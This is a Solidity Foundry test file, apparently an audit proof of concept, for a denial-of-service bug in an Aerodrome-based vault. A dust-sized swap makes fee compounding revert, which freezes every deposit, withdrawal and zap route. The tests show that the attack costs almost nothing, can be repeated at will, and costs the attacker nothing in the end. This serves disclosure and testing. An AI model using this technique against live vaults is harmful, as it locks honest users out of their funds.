// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPool} from "@crane/contracts/interfaces/protocols/dexes/aerodrome/IPool.sol";
import {IRouter} from "@crane/contracts/protocols/dexes/aerodrome/v1/interfaces/IRouter.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {MintableERC20Decimals} from "contracts/test/stubs/MintableERC20Decimals.sol";
import {
    TestBase_AerodromeStandardExchange
} from "contracts/protocols/dexes/aerodrome/v1/test/bases/TestBase_AerodromeStandardExchange.sol";

/// @notice gx-aerodrome-camelot-univ2 / A-DUST: _claimAndCompoundFees runs unconditionally (no try/catch) at the
/// start of every Aerodrome SE LP-moving route. When the claimed fee excess of one token is above
/// DEFAULT_DUST_THRESHOLD (1000 wei) but its half-swap rounds to 0 output in the other token, the Aerodrome
/// pool reverts (InsufficientOutputAmount) and the whole vault route reverts.
/// Realistic pair: WETH-like 18 dec (100 units) vs USDC-like 6 dec (300,000 units), price 3000.
contract AeroCompoundDustDoS is TestBase_AerodromeStandardExchange {
    MintableERC20Decimals tW;
    MintableERC20Decimals tU;
    IPool pool;
    IStandardExchangeProxy vault;

    address alice = makeAddr("alice"); // honest LP / vault depositor
    address bob = makeAddr("bob"); // honest zap depositor
    address trader = makeAddr("trader"); // honest organic trader
    address attacker = makeAddr("attacker");

    uint256 aliceShares;

    function setUp() public override {
        super.setUp();
        tW = new MintableERC20Decimals("WETH-like", "WETH", 18);
        tU = new MintableERC20Decimals("USDC-like", "USDC", 6);
        pool = IPool(aerodromePoolFactory.createPool(address(tW), address(tU), false));
        // seed pool from a neutral LP (this contract)
        _addLiq(address(this), 100e18, 300_000e6);
        vault = IStandardExchangeProxy(aerodromeStandardExchangeDFPkg.deployVault(pool));

        // alice: honest LP -> vault deposit
        uint256 lp = _addLiq(alice, 100e18, 300_000e6);
        vm.startPrank(alice);
        IERC20(address(pool)).approve(address(vault), lp);(aliceShares,) = vault.exchangeIn(IERC20(address(pool)), lp, IERC20(address(vault)), 1, alice, false, block.timestamp + 1);
        vm.stopPrank();
        assertGt(aliceShares, 0);
    }

    function _addLiq(address to, uint256 a, uint256 b) internal returns (uint256 lp) {
        tW.mint(address(this), a);
        tU.mint(address(this), b);
        tW.approve(address(aerodromeRouter), a);
        tU.approve(address(aerodromeRouter), b);
        (,, lp) = aerodromeRouter.addLiquidity(address(tW), address(tU), false, a, b, 0, 0, to, block.timestamp + 1);
    }

    function _swap(address who, MintableERC20Decimals tIn, MintableERC20Decimals tOut, uint256 amt) internal returns (uint256 out) {
        tIn.mint(who, amt);
        vm.startPrank(who);
        tIn.approve(address(aerodromeRouter), amt);
        IRouter.Route[] memory r = new IRouter.Route[](1);
        r[0] = IRouter.Route({from: address(tIn), to: address(tOut), stable: false, factory: address(aerodromePoolFactory)});
        uint256[] memory amts = aerodromeRouter.swapExactTokensForTokens(amt, 0, r, who, block.timestamp + 1);
        vm.stopPrank();
        out = amts[amts.length - 1];
    }

    function extSwap(address who, uint256 amt) external { require(msg.sender == address(this)); _swap(who, tW, tU, amt); }

    function _aliceWithdraw(uint256 shares) external returns (uint256) {
        require(msg.sender == address(this));
        vm.prank(alice);(uint256 quotedAmountOut,) = vault.exchangeIn(IERC20(address(vault)), shares, IERC20(address(pool)), 0, alice, false, block.timestamp + 1);
        return quotedAmountOut;
    }

    function _aliceZapOut(uint256 shares) external returns (uint256) {
        require(msg.sender == address(this));
        vm.prank(alice);(uint256 quotedAmountOut,) = vault.exchangeIn(IERC20(address(vault)), shares, IERC20(address(tU)), 0, alice, false, block.timestamp + 1);
        return quotedAmountOut;
    }

    /// Aerodrome Pool InsufficientOutputAmount() = 0x42301c23
    function _assertIOA(bytes memory r) internal pure {
        require(r.length >= 4 && bytes4(r) == bytes4(0x42301c23), "unexpected revert reason");
    }

    function _aliceZapOutExact(uint256 usdcOut, uint256 maxShares) external returns (uint256) {
        require(msg.sender == address(this));
        vm.prank(alice);
        return vault.exchangeOut(IERC20(address(vault)), maxShares, IERC20(address(tU)), usdcOut, alice, false, block.timestamp + 1);
    }

    function _bobZapIn(uint256 amt) external returns (uint256) {
        require(msg.sender == address(this));
        tU.mint(bob, amt);
        vm.prank(bob);
        tU.approve(address(vault), amt);
        vm.prank(bob);(uint256 quotedAmountOut,) = vault.exchangeIn(IERC20(address(tU)), amt, IERC20(address(vault)), 0, bob, false, block.timestamp + 1);
        return quotedAmountOut;
    }

    /// Attacker's only action: one tiny WETH->USDC swap in the public pool (WETH-only fee accrual to the vault).
    function test_dust_fee_freezes_all_vault_routes() public {
        uint256 atkSpend = 1e10; // 1e-8 WETH, ~0.00003 USD; attacker receives ~29 USDC wei back
        uint256 out = _swap(attacker, tW, tU, atkSpend);
        emit log_named_uint("attacker WETH spent (wei)", atkSpend);
        emit log_named_uint("attacker USDC received (wei)", out);

        uint256 half = aliceShares / 2;
        // honest withdraw (shares -> LP)
        try this._aliceWithdraw(half) returns (uint256) { emit log("withdraw LP: OK"); fail(); }
        catch (bytes memory r) { emit log_named_bytes("withdraw LP reverted", r); _assertIOA(r); }
        // honest zap-out (shares -> USDC)
        try this._aliceZapOut(half) returns (uint256) { emit log("zap-out: OK"); fail(); }
        catch (bytes memory r) { emit log_named_bytes("zap-out reverted", r); _assertIOA(r); }
        // honest exact-out zap-out (shares -> exactly 1000 USDC)
        try this._aliceZapOutExact(1000e6, half) returns (uint256) { emit log("exact-out zap-out: OK"); fail(); }
        catch (bytes memory r) { emit log_named_bytes("exact-out zap-out reverted", r); _assertIOA(r); }
        // honest zap-in deposit
        try this._bobZapIn(1000e6) returns (uint256) { emit log("bob zap-in: OK"); fail(); }
        catch (bytes memory r) { emit log_named_bytes("bob zap-in reverted", r); _assertIOA(r); }// preview still quotes as if nothing is wrong
        (uint256 pv,) = vault.previewExchangeIn(IERC20(address(vault)), half, IERC20(address(pool)));
        emit log_named_uint("previewExchangeIn shares->LP (still quotes)", pv);
        assertGt(pv, 0);

        // Liveness returns only after an organic WETH-side trade large enough to push the excess out of the band.
        _swap(trader, tW, tU, 1e18);
        uint256 got = this._aliceWithdraw(half);
        assertGt(got, 0, "heals after a large organic trade");
        emit log_named_uint("withdraw after organic 1 WETH trade (LP)", got);
    }

    function _lpDeposit(address who, uint256 lp) external returns (uint256) {
        require(msg.sender == address(this));
        vm.prank(who);
        IERC20(address(pool)).approve(address(vault), lp);
        vm.prank(who);(uint256 quotedAmountOut,) = vault.exchangeIn(IERC20(address(pool)), lp, IERC20(address(vault)), 0, who, false, block.timestamp + 1);
        return quotedAmountOut;
    }

    /// No attacker at all: after organic volume, consecutive honest vault ops (no swap of their own) compound; each
    /// compound's own zap swap accrues a one-sided fee to the vault that is ~0.1% of the zapped excess, so the
    /// pending excess decays geometrically and lands inside the frozen band.
    function test_natural_self_freeze_cascade() public {
        _swap(trader, tW, tU, 5e18);
        _swap(trader, tU, tW, 10_000e6);
        uint256 lp = _addLiq(bob, 1e16, 3e7);
        uint256 frozenAt = type(uint256).max;
        for (uint256 i; i < 8; ++i) {
            try this._lpDeposit(bob, lp / 8) returns (uint256) { emit log_named_uint("honest op OK", i); }
            catch (bytes memory r) { emit log_named_uint("honest op FROZEN at", i); emit log_named_bytes("reason", r); _assertIOA(r); frozenAt = i; break; }
        }
        assertLt(frozenAt, 8, "vault froze without any attacker");
        try this._aliceWithdraw(aliceShares) returns (uint256) { fail(); }
        catch (bytes memory r) { emit log_named_bytes("alice full withdraw reverted", r); }
    }

    /// Attacker re-freezes at will after organic volume: cheap LP-deposit triggers (or a dust swap) until frozen.
    function test_attacker_refreezes_after_organic_volume() public {
        _swap(trader, tW, tU, 5e18);
        _swap(trader, tU, tW, 10_000e6);
        uint256 atkLp = _addLiq(attacker, 1e15, 3e6);
        uint256 triggers;
        bool frozen;
        for (uint256 i; i < 8 && !frozen; ++i) {
            try this._lpDeposit(attacker, atkLp / 8) returns (uint256) { ++triggers; }
            catch { frozen = true; }
        }
        if (!frozen) _swap(attacker, tW, tU, 1e10);
        emit log_named_uint("attacker compound triggers used", triggers);
        try this._aliceWithdraw(aliceShares) returns (uint256) { fail(); }
        catch (bytes memory r) { emit log_named_bytes("alice full withdraw reverted", r); _assertIOA(r); }
        try this._bobZapIn(5000e6) returns (uint256) { fail(); }
        catch (bytes memory r) { emit log_named_bytes("bob zap-in reverted", r); _assertIOA(r); }
        // attacker loses nothing: its LP shares stay redeemable once anyone trades
        _swap(trader, tU, tW, 100e6);
        uint256 atkShares = IERC20(address(vault)).balanceOf(attacker);
        vm.prank(attacker);(uint256 back,) = vault.exchangeIn(IERC20(address(vault)), atkShares, IERC20(address(pool)), 0, attacker, false, block.timestamp + 1);
        emit log_named_uint("attacker LP in", atkLp / 8 * triggers);
        emit log_named_uint("attacker LP back after unfreeze", back);
        assertGe(back, atkLp / 8 * triggers, "attacker LP fully recoverable");
    }

    /// Band edges: excess just above 1000 wei up to ~2*reserveWETH/reserveUSDC freezes; outside it compounds fine.
    function test_band_scan() public {
        uint256[6] memory sizes = [uint256(1e9), 1e10, 1e11, 5e11, 1e12, 1e13];
        for (uint256 i; i < sizes.length; ++i) {
            uint256 snap = vm.snapshotState();
            try this.extSwap(attacker, sizes[i]) {} catch { emit log_named_uint("attacker swap itself reverts", sizes[i]); vm.revertToState(snap); continue; }
            bool ok;
            try this._aliceWithdraw(aliceShares / 4) returns (uint256) { ok = true; } catch {}
            emit log_named_uint(ok ? "OK      swap wei" : "FROZEN  swap wei", sizes[i]);
            vm.revertToState(snap);
        }
    }

    /// Control: same-decimal 1:1 pool (fixture aeroBalancedPool) is not frozen by a dust swap.
    function test_control_balanced_1to1_not_frozen() public {
        IStandardExchangeProxy v = IStandardExchangeProxy(aerodromeStandardExchangeDFPkg.deployVault(aeroBalancedPool));
        aeroBalancedTokenA.mint(address(this), 100e18);
        aeroBalancedTokenB.mint(address(this), 100e18);
        aeroBalancedTokenA.approve(address(aerodromeRouter), 100e18);
        aeroBalancedTokenB.approve(address(aerodromeRouter), 100e18);
        (,, uint256 lp) = aerodromeRouter.addLiquidity(address(aeroBalancedTokenA), address(aeroBalancedTokenB), false, 100e18, 100e18, 0, 0, address(this), block.timestamp + 1);
        IERC20(address(aeroBalancedPool)).approve(address(v), lp);(uint256 sh,) = v.exchangeIn(IERC20(address(aeroBalancedPool)), lp, IERC20(address(v)), 1, address(this), false, block.timestamp + 1);
        aeroBalancedTokenA.mint(address(this), 1e10);
        aeroBalancedTokenA.approve(address(aerodromeRouter), 1e10);
        IRouter.Route[] memory r = new IRouter.Route[](1);
        r[0] = IRouter.Route({from: address(aeroBalancedTokenA), to: address(aeroBalancedTokenB), stable: false, factory: address(aerodromePoolFactory)});
        aerodromeRouter.swapExactTokensForTokens(1e10, 0, r, address(this), block.timestamp + 1);(uint256 got,) = v.exchangeIn(IERC20(address(v)), sh / 2, IERC20(address(aeroBalancedPool)), 0, address(this), false, block.timestamp + 1);
        assertGt(got, 0);
    }
}
